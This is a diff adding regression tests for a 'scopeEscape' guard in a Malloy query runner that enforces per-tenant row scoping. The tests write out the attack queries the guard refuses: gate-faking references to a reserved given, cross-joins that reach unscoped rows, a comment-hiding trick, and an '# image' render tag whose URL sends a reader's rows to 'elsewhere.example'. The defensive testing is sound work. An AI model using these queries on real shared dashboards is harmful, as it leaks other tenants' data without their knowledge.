@@ -14,6 +14,7 @@ import assert from 'node:assert/strict';
 import * as malloy from '@malloydata/malloy';
 import {
   runRestricted,
+  scopeEscape,
   unreferencedGivens,
   unreferencedGivensMessage,
   withoutReservedGivens,
@@ -224,4 +225,123 @@ test('an UNFINALIZED reserved given cannot be set by the caller either', async (
   } finally {
     await cfg.shutdown('close');
   }
+});
+
+// --- text the CALLER wrote ---------------------------------------------------
+//
+// Everything above runs `run: rows`, a query the model defines. The gate —
+// "the compiled query references the given somewhere" — is sound for that. It
+// is not sound for text a caller writes, because a caller can put the reference
+// there. Each query below RETURNED BOTH TENANTS' ROWS, gate on, before
+// `scopeEscape` existed; they are kept as the queries, not as a description of
+// them, so the next person to loosen that rule has to watch them pass.
+
+/** One scoped source and the unfiltered one it is built on — an ordinary model. */
+const TWO_SOURCES = DECL.concat([
+  'source: raw is ' + SQL,
+  'source: mine is raw extend { where: who = $MALLOYYO_EMAIL }',
+]).join('\n');
+
+async function ask(text: string, opts: { gate?: boolean } = {}) {
+  const cfg = config(true);
+  try {
+    const reader = new malloy.InMemoryURLReader(new Map([[BASE + 'm.malloy', TWO_SOURCES]]));
+    const runtime = new malloy.Runtime({
+      config: cfg,
+      urlReader: reader,
+      givens: { MALLOYYO_EMAIL: 'a@b.com' },
+    } as never);
+    const out = await runRestricted(runtime, new URL(BASE + 'm.malloy'), text, {
+      ...(opts.gate === false ? {} : { requireGivens: REQUIRED }),
+    });
+    return out.ok
+      ? { ok: true as const, rows: out.rows }
+      : { ok: false as const, codes: (out.problems ?? []).map((p) => p.code) };
+  } finally {
+    await cfg.shutdown('close');
+  }
+}
+
+test('a caller cannot satisfy the gate by MENTIONING the given', async () => {
+  // The scoped source still answers, and only with the asker's row.
+  assert.deepEqual(await ask('run: mine -> { select: who }'), { ok: true, rows: [{ who: 'a@b.com' }] });
+  // The unfiltered one is refused, as it always was…
+  assert.deepEqual(await ask('run: raw -> { select: who }'), { ok: false, codes: ['given-not-referenced'] });
+  // …and stays refused with a column, or a filter, that only names the given.
+  for (const text of [
+    'run: raw -> { select: who, w is $MALLOYYO_EMAIL }',
+    'run: raw -> { select: who; where: $MALLOYYO_EMAIL = $MALLOYYO_EMAIL }',
+    'run: raw -> { select: who; where: who != $MALLOYYO_EMAIL }',
+  ]) {
+    assert.deepEqual(await ask(text), { ok: false, codes: ['scope-escape'] }, text);
+  }
+});
+
+test('…nor by JOINING a scoped source to an unscoped one, in either direction', async () => {
+  for (const text of [
+    // Rooted at the unfiltered source; the reference rides in on the join.
+    'run: raw extend { join_cross: m is mine } -> { select: who, x is m.who }',
+    // Rooted at the scoped one; the join reaches the rows it hides.
+    'run: mine extend { join_cross: r is raw } -> { select: other is r.who }',
+    // The same, as a source statement of the caller's own.
+    'source: x is raw extend { join_cross: m is mine }\nrun: x -> { select: who, y is m.who }',
+    'run: mine extend { JOIN_ONE: r is raw on true } -> { select: r.who }',
+  ]) {
+    assert.deepEqual(await ask(text), { ok: false, codes: ['scope-escape'] }, text);
+  }
+});
+
+test('the rule is about scoped data: with nothing required, the same text runs', async () => {
+  // A dataset that scopes by nothing has nothing to escape, and ad-hoc joins
+  // are an ordinary thing to write there.
+  const joined = await ask('run: raw extend { join_cross: m is mine } -> { select: who }', { gate: false });
+  assert.equal(joined.ok, true);
+});
+
+test('scopeEscape: what it refuses, and that it cannot be talked out of it', () => {
+  const R = ['MALLOYYO_EMAIL'];
+  assert.equal(scopeEscape('run: mine -> { select: who }', R), null);
+  assert.equal(scopeEscape('run: mine -> { select: who; where: region = $region }', R), null, 'ordinary givens are fine');
+  assert.equal(scopeEscape('run: mine -> { select: joined_at }', R), null, 'a field name is not a join');
+  assert.equal(scopeEscape('run: raw extend { join_one: m is mine }', []), null, 'nothing required, nothing refused');
+
+  assert.match(scopeEscape('select: w is $MALLOYYO_EMAIL', R) ?? '', /may not reference/);
+  assert.match(scopeEscape('select: w is $MALLOYYO_ROLES', R) ?? '', /may not reference/, 'any reserved name');
+  assert.match(scopeEscape('select: w is $malloyyo_email', R) ?? '', /may not reference/, 'whatever the case');
+  assert.match(scopeEscape('select: w is $ MALLOYYO_EMAIL', R) ?? '', /may not reference/, 'whatever the spacing');
+  assert.match(scopeEscape('extend { join_many: r is raw }', R) ?? '', /may not define a join/);
+
+  // No "it is only in a comment / a string": a scanner that skips comments can
+  // be handed a comment marker inside a string to hide what follows it.
+  assert.match(scopeEscape("select: a is '//', w is $MALLOYYO_EMAIL", R) ?? '', /may not reference/);
+  assert.match(scopeEscape('// $MALLOYYO_EMAIL\nrun: mine -> { select: who }', R) ?? '', /may not reference/);
+});
+
+// A draft dashboard or a shared query is written by one member and RUN AS
+// whoever opens it. On scoped data the rows are therefore the reader's — and a
+// column tagged `# image` whose value is a URL built from them has the reader's
+// browser deliver those rows to the author, without a click. `# link` is the
+// same with one.
+test('scopeEscape: the render tags that turn a value into a URL the browser loads', () => {
+  const R = ['MALLOYYO_EMAIL'];
+  const leak =
+    "run: mine -> { select:\n  # image\n  pic is concat('https://elsewhere.example/p.png?d=', who)\n}";
+  assert.match(scopeEscape(leak, R) ?? '', /"# image" or "# link"/);
+  assert.match(scopeEscape('select: # link\n  u is who', R) ?? '', /"# image" or "# link"/, 'wherever on the line it starts');
+  assert.match(scopeEscape('# percent IMAGE\nx is 1', R) ?? '', /"# image" or "# link"/, 'among other tags, any case');
+  assert.match(scopeEscape('# "im\\u0061ge"\nx is 1', R) ?? '', /"# image" or "# link"/, 'or spelled with an escape');
+
+  // Ordinary chart and layout tags, and the dashboard's own, are untouched.
+  assert.equal(scopeEscape('# bar_chart\nrun: mine -> { group_by: who }', R), null);
+  assert.equal(scopeEscape('# artifact { title="Mine" }\nquery: q is mine -> { select: who }', R), null);
+  // And on data that scopes by nothing, the author can already read every row
+  // a reader would: there is nothing to carry.
+  assert.equal(scopeEscape(leak, []), null);
+});
+
+test('a query carrying one is refused end to end on scoped data', async () => {
+  const text = "run: mine -> { select:\n  # image\n  pic is concat('https://elsewhere.example/?d=', who)\n}";
+  assert.deepEqual(await ask(text), { ok: false, codes: ['scope-escape'] });
+  const open = await ask(text, { gate: false });
+  assert.equal(open.ok, true, 'and runs where nothing is scoped');
 });
